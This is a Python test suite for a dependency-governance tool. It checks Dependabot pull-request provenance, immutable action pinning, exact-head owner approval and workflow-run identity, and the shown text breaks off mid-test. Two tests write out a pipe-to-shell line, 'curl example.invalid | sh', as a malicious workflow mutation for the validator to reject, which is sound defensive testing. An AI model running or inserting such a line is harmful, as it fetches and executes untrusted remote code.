from __future__ import annotations

import json
import re
import unittest
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch

from dependency_governance import (
    ACTION_LINE,
    Assessment,
    GovernanceError,
    PolicyBlock,
    PUBLISHED_PIP_CONSUMED_PULL_WORKFLOW_PATHS,
    classify_ecosystem,
    compare_versions,
    ensure_owner_review_and_approval,
    event_pull_number,
    has_exact_owner_approval,
    parse_dependabot_metadata,
    parse_positive_integer,
    published_pip_provenance,
    native_required_pull_qualification,
    qualification_for_head,
    reconcile_independently,
    render_comment,
    should_bulk_reconcile,
    request_dependabot_refresh,
    request_exact_head_native_workflow_approvals,
    request_exact_head_qualification_dispatches,
    select_qualification_run,
    trusted_dispatch_identity_matches,
    validate_actions_semantic_change,
    validate_config,
    validate_pip_manual,
    validate_provenance,
    validate_signed_metadata,
    wait_for_exact_head_native_required_checks,
    wait_for_exact_head_qualification_dispatches,
    workflow_identity_matches,
)

ROOT = Path(__file__).resolve().parents[2]
CONFIG = json.loads(
    (ROOT / ".github" / "dependency-governance.json").read_text(encoding="utf-8")
)


def canonical_fixture() -> tuple[str, str, dict, dict]:
    base_sha = "a" * 40
    head_sha = "b" * 40
    pull = {
        "number": 54,
        "state": "open",
        "draft": False,
        "created_at": "2026-09-01T12:00:00Z",
        "commits": 1,
        "changed_files": 1,
        "labels": [],
        "user": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "base": {
            "ref": CONFIG["baseBranch"],
            "sha": base_sha,
            "repo": {"full_name": "o/r"},
        },
        "head": {
            "ref": "dependabot/github_actions/routine-actions",
            "sha": head_sha,
            "repo": {"full_name": "o/r"},
        },
    }
    commit = {
        "sha": head_sha,
        "author": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "committer": {"login": CONFIG["trustedCommitterLogin"]},
        "commit": {
            "author": {
                "name": CONFIG["botLogin"],
                "email": CONFIG["botAuthorEmail"],
            },
            "committer": {
                "name": CONFIG["gitCommitterName"],
                "email": CONFIG["gitCommitterEmail"],
            },
            "verification": {
                "verified": True,
                "reason": "valid",
                "signature": "fixture-signature",
            },
            "message": (
                "deps(deps): bump actions/checkout\n\n---\nupdated-dependencies:\n"
                "- dependency-name: actions/checkout\n"
                "  dependency-version: '7.0.2'\n"
                "  dependency-type: direct:production\n"
                "  update-type: version-update:semver-patch\n"
                "...\n\n"
                + CONFIG["signedOffBy"]
            ),
        },
        "parents": [{"sha": base_sha}],
    }
    return base_sha, head_sha, pull, commit


class OwnerApi:
    def __init__(self, login: str = "portyu9", user_id: int = 35150859):
        self.identity = {"login": login, "id": user_id}
        self.comments: list[dict] = []
        self.reviews: list[dict] = []
        self.workflow_approvals: list[int] = []

    def get(self, path: str) -> dict:
        if path == "https://api.github.com/user":
            return self.identity
        raise AssertionError(path)

    def paginate(self, path: str, selector: str | None = None) -> list[dict]:
        if path.endswith("/comments"):
            return self.comments
        if path.endswith("/reviews"):
            return self.reviews
        raise AssertionError(path)

    def post(self, path: str, payload: dict) -> dict:
        if path.endswith("/comments"):
            item = {"id": len(self.comments) + 1, "body": payload["body"], "user": dict(self.identity)}
            self.comments.append(item)
            return item
        if path.endswith("/reviews"):
            item = {"id": len(self.reviews) + 1, "body": payload["body"], "user": dict(self.identity), "state": "APPROVED", "commit_id": payload["commit_id"]}
            self.reviews.append(item)
            return item
        match = re.fullmatch(r"/actions/runs/(\d+)/approve", path)
        if match:
            run_id = int(match.group(1))
            self.workflow_approvals.append(run_id)
            return {"approved": True, "runId": run_id}
        raise AssertionError(path)


class DependencyGovernanceTests(unittest.TestCase):
    def test_config_is_fail_closed(self) -> None:
        self.assertEqual(validate_config(CONFIG), [])
        major = {
            **CONFIG,
            "allowedActionUpdateTypes": [
                *CONFIG["allowedActionUpdateTypes"],
                "version-update:semver-major",
            ],
        }
        self.assertTrue(validate_config(major))
        self.assertTrue(validate_config({**CONFIG, "manualReviewPaths": []}))
        self.assertTrue(validate_config({**CONFIG, "ownerApprovalRequired": False}))
        self.assertTrue(validate_config({**CONFIG, "ownerApprovalUserId": 0}))

    def test_positive_integer_parser(self) -> None:
        self.assertEqual(parse_positive_integer("54"), 54)
        for value in ("0", "-1", "1.5", "abc", "9007199254740992"):
            with self.assertRaises(GovernanceError):
                parse_positive_integer(value)

    def test_metadata_parser(self) -> None:
        _, _, _, commit = canonical_fixture()
        metadata = parse_dependabot_metadata(commit["commit"]["message"])
        self.assertEqual(metadata[0]["name"], "actions/checkout")
        self.assertEqual(metadata[0]["updateType"], "version-update:semver-patch")

    def test_signed_metadata_requires_dependency_records(self) -> None:
        _, _, _, commit = canonical_fixture()
        self.assertTrue(validate_signed_metadata(commit)["eligible"])
        self.assertFalse(
            validate_signed_metadata({"commit": {"message": CONFIG["signedOffBy"]}})[
                "eligible"
            ]
        )

    def test_provenance_accepts_only_canonical_untouched_dependabot_commit(self) -> None:
        base, _, pull, commit = canonical_fixture()
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_provenance_rejects_spoofed_bot_identity(self) -> None:
        base, _, pull, commit = canonical_fixture()
        commit = json.loads(json.dumps(commit))
        commit["author"]["id"] = 123
        commit["commit"]["author"]["email"] = "dependabot[bot]@example.invalid"
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        self.assertRegex("\n".join(result["reasons"]), r"numeric identity|author email")

    def test_provenance_rejects_non_github_materialization_and_invalid_signature(self) -> None:
        base, _, pull, commit = canonical_fixture()
        commit = json.loads(json.dumps(commit))
        commit["committer"]["login"] = "someone"
        commit["commit"]["verification"]["reason"] = "unknown_key"
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        self.assertRegex("\n".join(result["reasons"]), r"materialized|signature")

    def test_provenance_rejects_human_second_commit_and_stale_base(self) -> None:
        base, _, pull, commit = canonical_fixture()
        pull2 = json.loads(json.dumps(pull))
        pull2["commits"] = 2
        result = validate_provenance(
            pull2,
            [commit, {"sha": "c" * 40}],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        stale = validate_provenance(
            pull,
            [commit],
            "d" * 40,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(stale["eligible"])

    def test_provenance_rejects_age_and_manual_review_label(self) -> None:
        base, _, pull, commit = canonical_fixture()
        old = json.loads(json.dumps(pull))
        old["created_at"] = "2026-08-01T12:00:00Z"
        labeled = json.loads(json.dumps(pull))
        labeled["labels"] = [{"name": "manual-review"}]
        now = datetime(2026, 9, 2, 12, tzinfo=timezone.utc)
        self.assertFalse(validate_provenance(old, [commit], base, CONFIG, now=now)["eligible"])
        self.assertFalse(
            validate_provenance(labeled, [commit], base, CONFIG, now=now)["eligible"]
        )

    def test_ecosystem_classification_is_exact(self) -> None:
        self.assertEqual(
            classify_ecosystem([{"filename": "requirements.txt"}], CONFIG), "pip"
        )
        self.assertEqual(
            classify_ecosystem([{"filename": ".github/workflows/ci.yml"}], CONFIG),
            "github-actions",
        )
        self.assertEqual(
            classify_ecosystem(
                [{"filename": "requirements.txt"}, {"filename": "README.md"}], CONFIG
            ),
            "unknown",
        )

    def test_pip_is_deliberately_manual_due_to_hash_lock_provenance(self) -> None:
        result = validate_pip_manual(CONFIG)
        self.assertFalse(result["eligible"])
        self.assertIn("four interpreter-specific hash locks", result["reasons"][0])

    def test_action_line_requires_immutable_sha_and_version_annotation(self) -> None:
        good = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1"
        codeql = "        uses: github/codeql-action/init@" + "b" * 40 + " # v4.38.1"
        self.assertIsNotNone(ACTION_LINE.fullmatch(good))
        self.assertIsNotNone(ACTION_LINE.fullmatch(codeql))
        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: actions/checkout@v7"))
        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: ./local-action"))

    def test_actions_patch_update_is_eligible(self) -> None:
        file = ".github/workflows/ci.yml"
        before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
        after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
        metadata = [
            {
                "name": "actions/checkout",
                "version": "7.0.2",
                "updateType": "version-update:semver-patch",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_actions_major_and_non_uses_mutation_are_blocked(self) -> None:
        file = ".github/workflows/ci.yml"
        before = (
            "steps:\n  - uses: actions/checkout@"
            + "a" * 40
            + " # v7.0.1\n  - run: echo safe\n"
        )
        major = (
            "steps:\n  - uses: actions/checkout@"
            + "b" * 40
            + " # v8.0.0\n  - run: echo safe\n"
        )
        metadata = [
            {
                "name": "actions/checkout",
                "version": "8.0.0",
                "updateType": "version-update:semver-major",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: major}, metadata, CONFIG
        )
        self.assertFalse(result["eligible"])
        mutated = major.replace("echo safe", "curl example.invalid | sh")
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
        )
        self.assertFalse(result["eligible"])
        self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))

    def test_control_plane_allows_only_proven_immutable_action_replacements(self) -> None:
        for file in (
            ".github/workflows/security.yml",
            ".github/workflows/dependency-governance.yml",
        ):
            before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
            after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
            metadata = [{"name": "actions/checkout", "version": "7.0.2", "updateType": "version-update:semver-patch"}]
            result = validate_actions_semantic_change(
                [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
            )
            self.assertTrue(result["eligible"], result["reasons"])
            mutated = after + "  - run: curl example.invalid | sh\n"
            result = validate_actions_semantic_change(
                [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
            )
            self.assertFalse(result["eligible"])

    def test_codeql_subpaths_are_semantically_eligible(self) -> None:
        file = ".github/workflows/security.yml"
        before = (
            "steps:\n"
            "  - name: Initialize CodeQL\n"
            "    uses: github/codeql-action/init@" + "a" * 40 + " # v4.38.0\n"
            "  - name: Analyze\n"
            "    uses: github/codeql-action/analyze@" + "a" * 40 + " # v4.38.0\n"
        )
        after = before.replace("a" * 40 + " # v4.38.0", "b" * 40 + " # v4.38.1")
        metadata = [
            {"name": "github/codeql-action/init", "version": "4.38.1", "updateType": "version-update:semver-patch"},
            {"name": "github/codeql-action/analyze", "version": "4.38.1", "updateType": "version-update:semver-patch"},
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_grouped_action_metadata_may_lag_exact_immutable_pin(self) -> None:
        file = ".github/workflows/security.yml"
        before = (
            "steps:\n"
            "  - name: Initialize CodeQL\n"
            "    uses: github/codeql-action/init@" + "a" * 40 + " # v4.38.0\n"
        )
        after = before.replace("a" * 40 + " # v4.38.0", "b" * 40 + " # v4.38.2")
        metadata = [
            {
                "name": "github/codeql-action/init",
                "version": "4.38.1",
                "updateType": "version-update:semver-patch",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_owner_identity_comment_approval_and_refresh_are_exact_head_bound(self) -> None:
        base, head, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": ".github/workflows/ci.yml"}],
            ecosystem="github-actions",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )
        owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
        ensure_owner_review_and_approval(owner, assessment, CONFIG)
        self.assertEqual(len(owner.comments), 1)
        self.assertEqual(len(owner.reviews), 1)
        self.assertTrue(has_exact_owner_approval(owner, pull["number"], head, CONFIG))
        ensure_owner_review_and_approval(owner, assessment, CONFIG)
        self.assertEqual(len(owner.comments), 1)
        self.assertEqual(len(owner.reviews), 1)
        with self.assertRaises(GovernanceError):
            ensure_owner_review_and_approval(OwnerApi("github-actions[bot]", 41898282), assessment, CONFIG)
        stale = Assessment(
            pull=pull,
            base_sha="c" * 40,
            files=assessment.files,
            ecosystem=assessment.ecosystem,
            provenance={"eligible": False, "reasons": ["PR is not rebased directly on the current base branch head"], "commit": commit},
            metadata=assessment.metadata,
            semantic=assessment.semantic,
            qualification=assessment.qualification,
        )
        refresh_owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
        self.assertTrue(request_dependabot_refresh(refresh_owner, stale, CONFIG))
        self.assertIn("@dependabot rebase", refresh_owner.comments[0]["body"])
        self.assertTrue(request_dependabot_refresh(refresh_owner, stale, CONFIG))
        self.assertEqual(len(refresh_owner.comments), 1)

        published = Assessment(
            pull=pull,
            base_sha="d" * 40,
            files=[
                {"filename": "requirements.txt"},
                {"filename": "requirements-lock/python-3.11.txt"},
                {"filename": "requirements-lock/python-3.12.txt"},
                {"filename": "requirements-lock/python-3.13.txt"},
                {"filename": "requirements-lock/python-3.14.txt"},
                {"filename": "requirements-lock/manifest.json"},
            ],
            ecosystem="pip",
            provenance={
                "eligible": False,
                "reasons": ["PR is not rebased directly on the current base branch head"],
                "commit": commit,
                "state": "dependabot-plus-trusted-lock-publisher",
            },
            metadata=assessment.metadata,
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification=assessment.qualification,
        )
        recreate_owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
        self.assertTrue(request_dependabot_refresh(recreate_owner, published, CONFIG))
        self.assertIn("@dependabot recreate", recreate_owner.comments[0]["body"])
        self.assertIn("trusted publisher", recreate_owner.comments[0]["body"])
        self.assertTrue(request_dependabot_refresh(recreate_owner, published, CONFIG))
        self.assertEqual(len(recreate_owner.comments), 1)

    def test_version_comparison_treats_zero_minor_as_breaking_risk(self) -> None:
        self.assertEqual(compare_versions("7.0.1", "7.0.2"), "patch")
        self.assertEqual(compare_versions("7.0.1", "7.1.0"), "minor")
        self.assertEqual(compare_versions("7.0.1", "8.0.0"), "major")
        self.assertEqual(compare_versions("0.36.0", "0.37.0"), "major-risk")
        self.assertEqual(compare_versions("7.0.1", "6.9.9"), "downgrade")

    def test_workflow_identity_binds_name_path_event_head_branch_and_optional_pr(self) -> None:
        _, head, pull, _ = canonical_fixture()
        requirement = CONFIG["requiredWorkflows"][0]
        run = {
            "id": 1,
            "name": requirement["workflow"],
            "path": f".github/workflows/{requirement['file']}",
            "event": "pull_request",
            "head_sha": head,
            "head_branch": pull["head"]["ref"],
            "pull_requests": [],
            "updated_at": "2026-09-02T10:00:00Z",
        }
        self.assertTrue(workflow_identity_matches(run, pull, requirement))
        self.assertTrue(
            workflow_identity_matches(
                {**run, "pull_requests": [{"number": pull["number"]}]}, pull, requirement
            )
        )
        for mutation in (
            {"name": "fake"},
            {"path": ".github/workflows/fake.yml"},
            {"event": "push"},
            {"head_sha": "c" * 40},
            {"head_branch": "dependabot/other"},
            {"pull_requests": [{"number": 999}]},
        ):
            self.assertFalse(workflow_identity_matches({**run, **mutation}, pull, requirement))
        newer_wrong = {
            **run,
            "id": 2,
            "path": ".github/workflows/fake.yml",
            "updated_at": "2026-09-02T11:00:00Z",
        }
        self.assertEqual(select_qualification_run([newer_wrong, run], pull, requirement)["id"], 1)

    def test_trusted_workflow_dispatch_is_exact_actor_and_subject_bound(self) -> None:
        _, head, pull, _ = canonical_fixture()
        requirement = CONFIG["requiredWorkflows"][0]
        dispatch = {
            "id": 2,
            "name": requirement["workflow"],
            "path": f".github/workflows/{requirement['file']}",
            "event": "workflow_dispatch",
            "head_sha": head,
            "head_branch": pull["head"]["ref"],
            "actor": {
                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
            },
            "triggering_actor": {
                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
            },
            "updated_at": "2026-09-02T11:00:00Z",
        }
        self.assertTrue(
            trusted_dispatch_identity_matches(dispatch, pull, requirement, CONFIG)
        )
        for mutation in (
            {"event": "push"},
            {"head_sha": "c" * 40},
            {"head_branch": "dependabot/other"},
            {"actor": {"login": "portyu9", "id": CONFIG["ownerApprovalUserId"]}},
            {
                "triggering_actor": {
                    "login": "portyu9",
                    "id": CONFIG["ownerApprovalUserId"],
                }
            },
        ):
            self.assertFalse(
                trusted_dispatch_identity_matches(
                    {**dispatch, **mutation}, pull, requirement, CONFIG
                )
            )

        pull_run = {
            **dispatch,
            "id": 1,
            "event": "pull_request",
            "actor": None,
            "triggering_actor": None,
            "pull_requests": [{"number": pull["number"]}],
            "updated_at": "2026-09-02T10:00:00Z",
        }
        selected = select_qualification_run(
            [pull_run, dispatch], pull, requirement, CONFIG
        )
        self.assertEqual(selected["id"], 2)

    def test_published_pip_consumes_only_expected_lock_action_required_run(self) -> None:
        _, head, pull, _ = canonical_fixture()

        class QualificationApi:
            def __init__(self) -> None:
                self.runs: list[dict] = []
                self.jobs: dict[int, list[dict]] = {}
                for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=10):
                    self.runs.append(
                        {
                            "id": index,
                            "name": requirement["workflow"],
                            "path": f".github/workflows/{requirement['file']}",
                            "event": "workflow_dispatch",
                            "head_sha": head,
                            "head_branch": pull["head"]["ref"],
                            "actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "triggering_actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "status": "completed",
                            "conclusion": "success",
                            "updated_at": f"2026-09-02T12:00:{index:02d}Z",
                        }
                    )
                    self.jobs[index] = [
                        {
                            "name": requirement["gate"],
                            "status": "completed",
                            "conclusion": "success",
                        }
                    ]
                self.lock_run = {
                    "id": 99,
                    "name": "dependency-locks",
                    "path": ".github/workflows/dependency-locks.yml",
                    "event": "pull_request",
                    "head_sha": head,
                    "head_branch": pull["head"]["ref"],
                    "pull_requests": [{"number": pull["number"]}],
                    "status": "completed",
                    "conclusion": "action_required",
                    "updated_at": "2026-09-02T12:01:00Z",
                }
                self.runs.append(self.lock_run)

            def paginate(self, path: str, selector: str | None = None) -> list[dict]:
                if path.startswith("/actions/runs?"):
                    self.assert_selector = selector
                    return list(self.runs)
                match = re.fullmatch(r"/actions/runs/(\d+)/jobs", path)
                if match:
                    return list(self.jobs[int(match.group(1))])
                raise AssertionError(path)

        api = QualificationApi()
        published = qualification_for_head(
            api,
            pull,
            CONFIG,
            consumed_action_required_pull_paths=PUBLISHED_PIP_CONSUMED_PULL_WORKFLOW_PATHS,
        )
        self.assertTrue(published["allSuccess"], published)
        self.assertFalse(published["anyFailed"])

        untrusted_exception = qualification_for_head(api, pull, CONFIG)
        self.assertFalse(untrusted_exception["allSuccess"])
        self.assertTrue(untrusted_exception["anyFailed"])

        api.lock_run["conclusion"] = "failure"
        failed_lock = qualification_for_head(
            api,
            pull,
            CONFIG,
            consumed_action_required_pull_paths=PUBLISHED_PIP_CONSUMED_PULL_WORKFLOW_PATHS,
        )
        self.assertFalse(failed_lock["allSuccess"])
        self.assertTrue(failed_lock["anyFailed"])

    def test_action_required_runs_dispatch_exact_head_once_with_security_refs(self) -> None:
        base, head, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": ".github/workflows/ci.yml"}],
            ecosystem="github-actions",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": False, "anyFailed": True, "qualifications": []},
        )

        class QualificationApi:
            def __init__(self) -> None:
                self.posts: list[tuple[str, dict]] = []
                self.runs = []
                for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=1):
                    self.runs.append(
                        {
                            "id": index,
                            "name": requirement["workflow"],
                            "path": f".github/workflows/{requirement['file']}",
                            "event": "pull_request",
                            "head_sha": head,
                            "head_branch": pull["head"]["ref"],
                            "pull_requests": [{"number": pull["number"]}],
                            "status": "completed",
                            "conclusion": "action_required",
                            "updated_at": f"2026-09-02T10:00:0{index}Z",
                        }
                    )

            def get(self, path: str) -> dict:
                self.assert_ref_path = path
                return {"object": {"sha": head}}

            def paginate(self, path: str, selector: str | None = None) -> list[dict]:
                self.assert_runs_path = path
                self.assert_selector = selector
                return list(self.runs)

            def post(self, path: str, payload: dict) -> None:
                self.posts.append((path, payload))

        api = QualificationApi()
        outcomes = request_exact_head_qualification_dispatches(
            api, assessment, CONFIG
        )
        self.assertEqual(len(api.posts), len(CONFIG["requiredWorkflows"]))
        self.assertTrue(all(item["state"] == "requested" for item in outcomes))
        security_post = next(
            payload
            for path, payload in api.posts
            if path.endswith("/security.yml/dispatches")
        )
        self.assertEqual(security_post["ref"], pull["head"]["ref"])
        self.assertEqual(
            security_post["inputs"],
            {"governance-base-sha": base, "governance-head-sha": head},
        )

        trusted_existing = []
        for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=100):
            trusted_existing.append(
                {
                    "id": index,
                    "name": requirement["workflow"],
                    "path": f".github/workflows/{requirement['file']}",
                    "event": "workflow_dispatch",
                    "head_sha": head,
                    "head_branch": pull["head"]["ref"],
                    "actor": {
                        "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                        "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                    },
                    "triggering_actor": {
                        "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                        "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                    },
                    "status": "queued",
                    "conclusion": None,
                    "updated_at": f"2026-09-02T11:00:{index - 100:02d}Z",
                }
            )
        api.runs.extend(trusted_existing)
        api.posts.clear()
        outcomes = request_exact_head_qualification_dispatches(
            api, assessment, CONFIG
        )
        self.assertEqual(api.posts, [])
        self.assertTrue(all(item["state"] == "existing-queued" for item in outcomes))

    def test_published_native_action_required_runs_are_owner_approved_exactly(self) -> None:
        base, head, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "requirements.txt"}],
            ecosystem="pip",
            provenance={
                "eligible": True,
                "reasons": [],
                "commit": commit,
                "state": "dependabot-plus-trusted-lock-publisher",
            },
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )

        class NativeApi:
            def __init__(self) -> None:
                self.runs: list[dict] = []
                for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=40):
                    self.runs.append(
                        {
                            "id": index,
                            "name": requirement["workflow"],
                            "path": f".github/workflows/{requirement['file']}",
                            "event": "pull_request",
                            "head_sha": head,
                            "head_branch": pull["head"]["ref"],
                            "pull_requests": [{"number": pull["number"]}],
                            "actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "triggering_actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "status": "completed",
                            "conclusion": "action_required",
                            "updated_at": f"2026-09-02T12:00:{index:02d}Z",
                        }
                    )

            def get(self, path: str) -> dict:
                match = re.fullmatch(r"/actions/runs/(\d+)", path)
                if match:
                    run_id = int(match.group(1))
                    return next(run for run in self.runs if int(run["id"]) == run_id)
                self.ref_path = path
                return {"object": {"sha": head}}

            def paginate(self, path: str, selector: str | None = None) -> list[dict]:
                self.runs_path = path
                self.selector = selector
                return list(self.runs)

        api = NativeApi()
        owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
        outcomes = request_exact_head_native_workflow_approvals(
            api, owner, assessment, CONFIG
        )
        self.assertEqual(
            owner.workflow_approvals,
            list(range(40, 40 + len(CONFIG["requiredWorkflows"]))),
        )
        self.assertTrue(
            all(item["state"] == "approval-requested" for item in outcomes)
        )

        class RacingOwnerApi(OwnerApi):
            def __init__(self, native_api: NativeApi, *, converge: bool) -> None:
                super().__init__(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
                self.native_api = native_api
                self.converge = converge
                self.raced = False

            def post(self, path: str, payload: dict) -> dict:
                match = re.fullmatch(r"/actions/runs/(\d+)/approve", path)
                if match and not self.raced:
                    self.raced = True
                    run_id = int(match.group(1))
                    run = next(item for item in self.native_api.runs if int(item["id"]) == run_id)
                    if self.converge:
                        run["status"] = "queued"
                        run["conclusion"] = None
                        run["triggering_actor"] = {
                            "login": CONFIG["ownerApprovalLogin"],
                            "id": CONFIG["ownerApprovalUserId"],
                        }
                    raise GovernanceError(
                        "GitHub API POST https://api.github.com/repos/o/r/actions/runs/"
                        f"{run_id}/approve failed (403): "
                        '{"message":"This workflow run is not waiting for approval"}'
                    )
                return super().post(path, payload)

        race_api = NativeApi()
        racing_owner = RacingOwnerApi(race_api, converge=True)
        race_outcomes = request_exact_head_native_workflow_approvals(
            race_api, racing_owner, assessment, CONFIG
        )
        self.assertEqual(race_outcomes[0]["state"], "already-queued")
        self.assertEqual(
            racing_owner.workflow_approvals,
            list(range(41, 40 + len(CONFIG["requiredWorkflows"]))),
        )

        blocked_race_api = NativeApi()
        with self.assertRaisesRegex(GovernanceError, "not waiting for approval"):
            request_exact_head_native_workflow_approvals(
                blocked_race_api,
                RacingOwnerApi(blocked_race_api, converge=False),
                assessment,
                CONFIG,
            )

        api.runs[0]["actor"] = {
            "login": CONFIG["ownerApprovalLogin"],
            "id": CONFIG["ownerApprovalUserId"],
        }
        with self.assertRaises(PolicyBlock):
            request_exact_head_native_workflow_approvals(
                api, OwnerApi(), assessment, CONFIG
            )

    def test_native_protected_check_qualification_requires_exact_gate_success(self) -> None:
        _, head, pull, _ = canonical_fixture()

        class NativeApi:
            def __init__(self) -> None:
                self.runs: list[dict] = []
                self.jobs: dict[int, list[dict]] = {}
                for index, requirement in enumerate(CONFIG["requiredWorkflows"], start=60):
                    self.runs.append(
                        {
                            "id": index,
                            "name": requirement["workflow"],
                            "path": f".github/workflows/{requirement['file']}",
                            "event": "pull_request",
                            "head_sha": head,
                            "head_branch": pull["head"]["ref"],
                            "pull_requests": [{"number": pull["number"]}],
                            "actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "triggering_actor": {
                                "login": CONFIG["trustedWorkflowDispatchActorLogin"],
                                "id": CONFIG["trustedWorkflowDispatchActorUserId"],
                            },
                            "status": "completed",
                            "conclusion": "success",
                            "updated_at": f"2026-09-02T12:01:{index:02d}Z",
                        }
                    )
                    self.jobs[index] = [
                        {
                            "name": requirement["gate"],
                            "status": "completed",
                            "conclusion": "success",
                        }
                    ]

            def paginate(self, path: str, selector: str | None = None) -> list[dict]:
                if path.startswith("/actions/runs?"):
                    return list(self.runs)
                match = re.fullmatch(r"/actions/runs/(\d+)/jobs", path)
                if match:
                    return list(self.jobs[int(match.group(1))])
                raise AssertionError(path)

        api = NativeApi()
        result = native_required_pull_qualification(
            api,
            pull,
            CONFIG,
            require_trusted_publisher_actor=True,
        )
        self.assertTrue(result["allSuccess"], result)
        self.assertFalse(result["anyFailed"])

        first_id = int(api.runs[0]["id"])
        api.jobs[first_id][0]["conclusion"] = "failure"
        failed = native_required_pull_qualification(
            api,
            pull,
            CONFIG,
            require_trusted_publisher_actor=True,
        )
        self.assertFalse(failed["allSuccess"])
        self.assertTrue(failed["anyFailed"])

        api.jobs[first_id][0]["conclusion"] = "success"
        api.runs[0]["triggering_actor"] = {
            "login": CONFIG["ownerApprovalLogin"],
            "id": CONFIG["ownerApprovalUserId"],
        }
        owner_approved = native_required_pull_qualification(
            api,
            pull,
            CONFIG,
            require_trusted_publisher_actor=True,
        )
        self.assertTrue(owner_approved["allSuccess"], owner_approved)
        self.assertFalse(owner_approved["anyFailed"])

        api.runs[0]["triggering_actor"] = {"login": "someone", "id": 123}
        spoofed = native_required_pull_qualification(
            api,
            pull,
            CONFIG,
            require_trusted_publisher_actor=True,
        )
        self.assertFalse(spoofed["allSuccess"])
        self.assertTrue(spoofed["anyFailed"])

    def test_native_check_wait_combines_protected_gate_evidence(self) -> None:
        base, head, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "requirements.txt"}],
            ecosystem="pip",
            provenance={
                "eligible": True,
                "reasons": [],
                "commit": commit,
                "state": "dependabot-plus-trusted-lock-publisher",
            },
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )

        class NativeApi:
            def __init__(self) -> None:
                self.runs: list[dict] = []
                self.jobs: dict[int, list[dict]] = {}
